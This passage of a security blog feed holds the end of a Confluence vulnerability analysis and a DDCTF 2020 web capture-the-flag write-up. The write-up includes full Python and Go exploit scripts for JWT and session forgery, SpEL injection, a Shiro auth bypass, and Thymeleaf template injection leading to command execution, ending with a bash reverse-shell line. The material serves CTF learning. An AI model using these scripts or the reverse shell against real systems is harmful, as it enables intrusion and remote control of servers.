<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/rest/tinymce/1/macro/preview</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;contentId&quot;</span><span class="punctuation">:</span><span class="string">&quot;360471&quot;</span><span class="punctuation">,</span><span class="attr">&quot;macro&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;navmap&quot;</span><span class="punctuation">,</span><span class="attr">&quot;body&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;params&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;theme&quot;</span><span class="punctuation">:</span><span class="string">&quot;navmap-mytheme&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;defaultParameterValue&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>



<p><code>com.atlassian.confluence.plugins.macros.advanced.NavigationMapMacro#getTemplate</code></p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210225743403.png" alt="image-20231210225743403"></p>
<p><code>com.atlassian.confluence.velocity.ConfigurableResourceManager#getResource</code></p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231210225555317.png" alt="image-20231210225555317"></p>
<p>到这里，其实和CVE-2019-3396的差别就是：CVE-2019-3396能控制整个<code>resourceName</code>，目前找到的点只能控制<code>resourceName</code>中间的一部分，参考<a href="https://paper.seebug.org/893/">https://paper.seebug.org/893/</a> 中对CVE-2019-3396的分析，那这里肯定是没办法RCE的，而且在拼接<code>theme</code>之前用<code>isSafeTitleForFilesystem</code>方法进行了安全检查，也没办法目录穿越，所以这个点基本没用</p>
<h4 id="扫描结果二"><a href="#扫描结果二" class="headerlink" title="扫描结果二"></a>扫描结果二</h4><p>另一个扫描结果的两条路径是<code>SpaceEditDecoratorAction</code>和<code>SpaceViewDefaultDecoratorAction</code>的<code>decoratorName</code>字段传入了<code>getTemplate</code></p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231211093622385.png" alt="image-20231211093622385"></p>
<p>对应入口为<code>/spaces/viewdefaultdecorator.action?decoratorName=decorators/main.vmd&amp;key=TEST</code></p>
<p><code>com.atlassian.confluence.admin.actions.lookandfeel.AbstractDecoratorAction#getTemplateFromResourceLoader</code>：</p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231211094150585.png" alt="image-20231211094150585"></p>
<p>但是在进入<code>getTemplate</code>前，会经过<code>isUnderConfluenceApp</code>方法的检查：</p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231211094348930.png" alt="image-20231211094348930"></p>
<p>这个方法的关键就是<code>URI.create(decoratorName).isAbsolute()</code>，在java中，就是判断scheme是否为null：</p>
<p><img src="/2024/01/28/Confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20231211094457434.png" alt="image-20231211094457434"></p>
<p>所以如果想像CVE-2019-3396一样传入<code>file:///...</code>或<code>http://...</code>是不行的。我也试了强行向<code>getTemplate</code>传入<code>file:///...</code>，<code>http://...</code>，<code>ftp://...</code>，也是没办法成功的，可能和Tomcat版本有关，或者是Confluence针对这种注入做了某种特定的修复</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://confluence.atlassian.com/pages/viewpage.action?pageId=1319570362">https://confluence.atlassian.com/pages/viewpage.action?pageId=1319570362</a></p>
<p><a href="https://paper.seebug.org/884/">https://paper.seebug.org/884/</a></p>
<p><a href="https://paper.seebug.org/893/">https://paper.seebug.org/893/</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Confluence</tag>
      </tags>
  </entry>
  <entry>
    <title>DDCTF 2020 WEB WriteUp</title>
    <url>/2020/09/04/DDCTF-2020-WEB-WriteUp/</url>
    <content><![CDATA[<p>DDCTF 2020 WEB WriteUp</p>
<span id="more"></span>

<h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200904205954880.png" alt="image-20200904205954880"></p>
<p>第一个POST传入username和pwd会返回token，第二个POST传入username，pwd和token会得到client下载链接，但第二个POST直接提交是提示need ADMIN permission，看来需要伪造JWT，一开始利用<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>爆破很久都没成功，后来队友成功了，发现secret key就是第一个POST包中自己传入的pwd，而我是因为一开始填的pwd太复杂…</p>
<p>将JWT中的userRole修改为ADMIN POST到<code>/admin/auth</code>得到client下载地址</p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200906011150956.png" alt="image-20200906011150956"></p>
<p>clinet向服务器发送command，可以在命令行<code>export http_proxy=ip:port</code>设置代理，burp抓包</p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200906011338970.png" alt="image-20200906011338970"></p>
<p>需要先解决的是signature的算法，队友逆出签名计算方法为 HMAC sha256 加密 <code>command|time_stamp</code> 后base64编码，HMAC加密的密钥为DDCTFWithYou</p>
<p>然后测试了很久发现是可以注入SPEL表达式，最终POC:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSignature</span>(<span class="params">command,time</span>):</span><br><span class="line">    command=urllib.parse.quote(command)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;1024tools.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://1024tools.com/hmac&quot;</span></span><br><span class="line">    data=<span class="string">&quot;query=&quot;</span>+command+<span class="string">&quot;|&quot;</span>+time+<span class="string">&quot;&amp;algo=sha256&amp;key=DDCTFWithYou&quot;</span></span><br><span class="line">    res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line">    r=re.<span class="built_in">compile</span>(<span class="string">&#x27;B:（HMAC(.*?)&lt;textarea class=&quot;form-control&quot; id=&quot;result_base64&quot; rows=&quot;2&quot; spellcheck=&quot;false&quot; name=&quot;result&quot; cols=&quot;50&quot;&gt;(.*?)&lt;/textarea&gt;&#x27;</span>,re.DOTALL)</span><br><span class="line">    <span class="keyword">return</span> r.search(res.text).group(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendCommand</span>(<span class="params">command,time</span>):</span><br><span class="line">    signature = getSignature(command,time)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;117.51.136.197&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;http://117.51.136.197/server/command&quot;</span></span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;signature&quot;:&quot;&#x27;</span>+signature+<span class="string">&#x27;&quot;,&quot;command&quot;:&quot;&#x27;</span>+command+<span class="string">&#x27;&quot;,&quot;timestamp&quot;:&#x27;</span>+time+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">    res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;T(java.nio.file.Files).lines(T(java.nio.file.Paths).get(&#x27;/home/dc2-user/flag/flag.txt&#x27;))&quot;</span></span><br><span class="line"><span class="built_in">print</span>(sendCommand(command,<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))))</span><br></pre></td></tr></table></figure>



<h2 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h2><p>借入卡片的时候有溢出漏洞，借入1000000000000，账户立即入账1000000000000，但只需还3567587330，然后兑换礼物</p>
<p>得到提示</p>
<blockquote>
<p>url: &#x2F;flag , SecKey: Udc13VD5adM_c10nPxFu@v12</p>
</blockquote>
<p>由cookie中session的特征一顿百度谷歌后，确定了是来自Golang的securecookie，<code>Udc13VD5adM_c10nPxFu@v12</code>是密钥，应该是需要伪造session中的某些字段（这里是将admin设为true），POC如下</p>
<p>（session base64解码后是明文数据，所以<code>securecookie.New(hashKey, nil)</code>第二个参数应该传入nil，至于map[interface{}]interface{}这个结构的构造，由于不太懂Golang，是观察session base64解密后的明文试了很久才得出的）</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">//go get github.com/gorilla/sessions</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/gorilla/securecookie&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hashKey = []<span class="type">byte</span>(<span class="string">&quot;Udc13VD5adM_c10nPxFu@v12&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> s = securecookie.New(hashKey, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  encode()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">encode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  value := <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">interface</span>&#123;&#125; &#123;<span class="string">&quot;admin&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;wallet&quot;</span>:<span class="string">&quot;&#123;\&quot;owings\&quot;:[],\&quot;invests\&quot;:[],\&quot;money\&quot;:996432412472,\&quot;now_time\&quot;:1599208994,\&quot;start_time\&quot;:1599208954&#125;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">  encoded, err := s.Encode(<span class="string">&quot;session&quot;</span>, value)</span><br><span class="line">  <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(encoded)</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">decode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  value := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">  <span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> err = s.Decode(<span class="string">&quot;session&quot;</span>, <span class="string">&quot;MTU5OTIwOTAzNHxEdi1CQkFFQ180SUFBUkFCRUFBQV81Yl9nZ0FDQm5OMGNtbHVad3dIQUFWaFpHMXBiZ1JpYjI5c0FnSUFBQVp6ZEhKcGJtY01DQUFHZDJGc2JHVjBCbk4wY21sdVp3eGZBRjE3SW05M2FXNW5jeUk2VzEwc0ltbHVkbVZ6ZEhNaU9sdGRMQ0p0YjI1bGVTSTZPVGsyTkRNeU5ERXlORGN5TENKdWIzZGZkR2x0WlNJNk1UVTVPVEl3T0RrNU5Dd2ljM1JoY25SZmRHbHRaU0k2TVRVNU9USXdPRGsxTkgwPXyt-B6Jm23Kk8B5z2K_UKTx67JL4Qxam0wgJg3Oh7H38w==&quot;</span>, &amp;value); err == <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(value)</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后带上伪造的session访问<code>/flag</code></p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200904205228577.png" alt="image-20200904205228577"></p>
<h2 id="Easy-Web"><a href="#Easy-Web" class="headerlink" title="Easy Web"></a>Easy Web</h2><p>这题从早上一直肝到下午，终于拿到一血，感觉对Java知识点考察很多</p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905145712350.png" alt="image-20200905145712350"></p>
<p>抓包发现有rememberMe&#x3D;deleteMe，第一反应是Shiro反序列化漏洞，拿Xray跑了一波常用key无果，就又尝试了Shiro的权限绕过漏洞，成功访问到index路由</p>
<p><a href="https://l3yx.github.io/2020/06/30/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/">CVE-2020-11989</a></p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905150124229.png" alt="image-20200905150124229"></p>
<p>在网页源码中发现文件下载接口<code>./img?img=static/hello.jpg</code>，然后此时的思路就是读配置文件，读class文件，审计，找洞</p>
<p>WEB项目首先是<code>WEB-INF/web.xml</code></p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905150749583.png" alt="image-20200905150749583"></p>
<p>比较有用的是这俩spring的配置，这里classpath是指WEB-INF目录下的classes目录</p>
<p><code>WEB-INF/classes/spring-web.xml</code></p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905151511297.png" alt="image-20200905151511297"></p>
<p>拿到了项目部分包名，后面读取class文件时需要（包名对应路径）</p>
<p><code>WEB-INF/classes/spring-core.xml</code></p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905151740145.png" alt="image-20200905151740145"></p>
<p>其实看到有个模板引擎thymeleaf就猜到后面可能要考Java的模板注入</p>
<p><code>WEB-INF/classes/spring-shiro.xml</code></p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905152033326.png" alt="image-20200905152033326"></p>
<p>得到一个类名，那就可以读取class文件了</p>
<p><code>WEB-INF/classes/com/ctf/auth/ShiroRealm.class</code></p>
<p>然后反编译根据Java代码中的import的类去读取了其他class，但没有具体进展，最后是由命名规则猜测文件名得到了<code>WEB-INF/classes/com/ctf/controller/AuthController.class</code></p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905152731294.png" alt="image-20200905152731294"></p>
<p>是admin的话重定向到这个路由，那么直接利用Shiro权限绕过漏洞访问</p>
<p><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index</a></p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905152908078.png" alt="image-20200905152908078"></p>
<p>没错就是考察的thymeleaf模板注入，不过这里貌似有黑名单，具体表现就是不能出现引号，也就是说字符串要另外想办法构造，不能出现某些方法的关键字，比如File类中的readXxx方法，反射中的invoke方法，导致没办法用常规办法执行命令和读取文件，也不能通过反射动态调用被ban的方法。</p>
<p>后面很多时间都是在绕这里的限制，最后的解决方法就是</p>
<p>字符串通过字符拼接来构造</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">th:value</span>=<span class="string">$&#123;T(com.ctf.model.User).getName()[3].replace(46,108)+T(com.ctf.model.User).getName()[3].replace(46,51)+T(com.ctf.model.User).getName()[3].replace(46,121)+T(com.ctf.model.User).getName()[3].replace(46,120)&#125;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>防止类名被ban，使用getClassLoader的loadClass动态加载所需类</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">th:value</span>=<span class="string">$&#123;T(com.ctf.model.User).getClassLoader().loadClass(类名字符串)&#125;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用Files类的list和lines方法列举和读取文件，使用toArray() 和 Arrays.toString() 把内容流转换为字符串输出</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Arrays.toString( java.nio.file.Files.list(java.nio.file.Paths.get(<span class="string">&quot;/&quot;</span>)).toArray() );</span><br><span class="line">Arrays.toString( java.nio.file.Files.lines(java.nio.file.Paths.get(<span class="string">&quot;/etc/passwd&quot;</span>)).toArray() );</span><br></pre></td></tr></table></figure>

<p>最后POC如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;116.85.37.131&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://116.85.37.131&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] submit...&quot;</span>)</span><br><span class="line">    url = <span class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize&quot;</span></span><br><span class="line">    data = <span class="string">&quot;content=&quot;</span>+urllib.parse.quote_plus(payload)</span><br><span class="line"></span><br><span class="line">    res = requests.post(url = url,headers = headers,data = data)</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;Success! Please fetch .(.*)? !&quot;</span>,res.text) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> re.search(<span class="string">&quot;Success! Please fetch .(.*)? !&quot;</span>,res.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResult</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] getResult...&quot;</span>)</span><br><span class="line">    url = <span class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef&quot;</span>+url</span><br><span class="line"></span><br><span class="line">    res = requests.get(url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getString</span>(<span class="params">string</span>):</span><br><span class="line">    strc=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        strc = strc + <span class="string">&quot;T(com.ctf.model.User).getName()[3].replace(46,&#123;&#125;)+&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">ord</span>(i)))</span><br><span class="line">    <span class="keyword">return</span> strc[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getClass</span>(<span class="params">className</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;T(com.ctf.model.User).getClassLoader().loadClass(&quot;</span>+getString(className)+<span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;$&#123;&quot;</span>+getClass(<span class="string">&quot;java.util.Arrays&quot;</span>)+<span class="string">&quot;.toString(&quot;</span>+    getClass(<span class="string">&quot;java.nio.file.Files&quot;</span>)+<span class="string">&quot;.list(&quot;</span>+getClass(<span class="string">&quot;java.nio.file.Paths&quot;</span>)+<span class="string">&quot;.get(&quot;</span>+getString(<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;)).toArray()&quot;</span>     +<span class="string">&quot;)&#125;&quot;</span></span><br><span class="line">poc = <span class="string">&quot;&lt;input th:value=&quot;</span>+poc+<span class="string">&quot;&gt;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(getResult(render(poc)))</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;$&#123;&quot;</span>+getClass(<span class="string">&quot;java.util.Arrays&quot;</span>)+<span class="string">&quot;.toString(&quot;</span>+    getClass(<span class="string">&quot;java.nio.file.Files&quot;</span>)+<span class="string">&quot;.lines(&quot;</span>+getClass(<span class="string">&quot;java.nio.file.Paths&quot;</span>)+<span class="string">&quot;.get(&quot;</span>+getString(<span class="string">&quot;/flag_is_here&quot;</span>)+<span class="string">&quot;)).toArray()&quot;</span>     +<span class="string">&quot;)&#125;&quot;</span></span><br><span class="line">poc = <span class="string">&quot;&lt;input th:value=&quot;</span>+poc+<span class="string">&quot;&gt;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(getResult(render(poc)))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200905151213122.png" alt="image-20200905151213122"></p>
<p>比赛结束后又尝试了绕过限制getShell成功</p>
<p><img src="/2020/09/04/DDCTF-2020-WEB-WriteUp/image-20200908160754830.png" alt="image-20200908160754830"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] submit...&quot;</span>)</span><br><span class="line">    url = <span class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize&quot;</span></span><br><span class="line">    data = <span class="string">&quot;content=&quot;</span>+urllib.parse.quote_plus(payload)</span><br><span class="line"></span><br><span class="line">    res = requests.post(url = url,headers = headers,data = data)</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;Success! Please fetch .(.*)? !&quot;</span>,res.text) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> re.search(<span class="string">&quot;Success! Please fetch .(.*)? !&quot;</span>,res.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResult</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] getResult...&quot;</span>)</span><br><span class="line">    url = <span class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef&quot;</span>+url</span><br><span class="line"></span><br><span class="line">    res = requests.get(url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getString</span>(<span class="params">string</span>):</span><br><span class="line">    strc=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        strc = strc + <span class="string">&quot;T(com.ctf.model.User).getName()[3].replace(46,&#123;&#125;)+&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">ord</span>(i)))</span><br><span class="line">    <span class="keyword">return</span> strc[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getClass</span>(<span class="params">className</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;T(com.ctf.model.User).getClassLoader().loadClass(&quot;</span>+getString(className)+<span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResultWithParameter</span>(<span class="params">url,parameter</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] getResult...&quot;</span>)</span><br><span class="line">    url = <span class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef&quot;</span>+url+parameter</span><br><span class="line"></span><br><span class="line">    res = requests.get(url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;[[$&#123;&quot;</span>+getClass(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>)+<span class="string">&quot;.getConstructors()[1].newInstance(#request.getParameterValues(&quot;</span>+getString(<span class="string">&quot;cmd&quot;</span>)+<span class="string">&quot;)).start()&#125;]]&quot;</span></span><br><span class="line"><span class="built_in">print</span>(getResultWithParameter(submit(poc),<span class="string">&quot;?cmd=/bin/bash&amp;cmd=-c&amp;cmd=echo success&gt; /tmp/leixiao&quot;</span>))</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;$&#123;&quot;</span>+getClass(<span class="string">&quot;java.util.Arrays&quot;</span>)+<span class="string">&quot;.toString(&quot;</span>+    getClass(<span class="string">&quot;java.nio.file.Files&quot;</span>)+<span class="string">&quot;.list(&quot;</span>+getClass(<span class="string">&quot;java.nio.file.Paths&quot;</span>)+<span class="string">&quot;.get(&quot;</span>+getString(<span class="string">&quot;/tmp&quot;</span>)+<span class="string">&quot;)).toArray()&quot;</span>     +<span class="string">&quot;)&#125;&quot;</span></span><br><span class="line">poc = <span class="string">&quot;&lt;input th:value=&quot;</span>+poc+<span class="string">&quot;&gt;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(getResult(submit(poc)))</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;$&#123;&quot;</span>+getClass(<span class="string">&quot;java.util.Arrays&quot;</span>)+<span class="string">&quot;.toString(&quot;</span>+    getClass(<span class="string">&quot;java.nio.file.Files&quot;</span>)+<span class="string">&quot;.lines(&quot;</span>+getClass(<span class="string">&quot;java.nio.file.Paths&quot;</span>)+<span class="string">&quot;.get(&quot;</span>+getString(<span class="string">&quot;/tmp/leixiao&quot;</span>)+<span class="string">&quot;)).toArray()&quot;</span>     +<span class="string">&quot;)&#125;&quot;</span></span><br><span class="line">poc = <span class="string">&quot;&lt;input th:value=&quot;</span>+poc+<span class="string">&quot;&gt;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(getResult(submit(poc)))</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">getResultWithParameter(submit(poc),<span class="string">&quot;?cmd=/bin/bash&amp;cmd=-c&amp;cmd=&quot;</span>+urllib.parse.quote_plus(<span class="string">&quot;/bin/bash -i &gt;&amp;/dev/tcp/x.x.x.x/7777 0&gt;&amp;1&quot;</span>) )</span><br></pre></td></tr></table></figure>

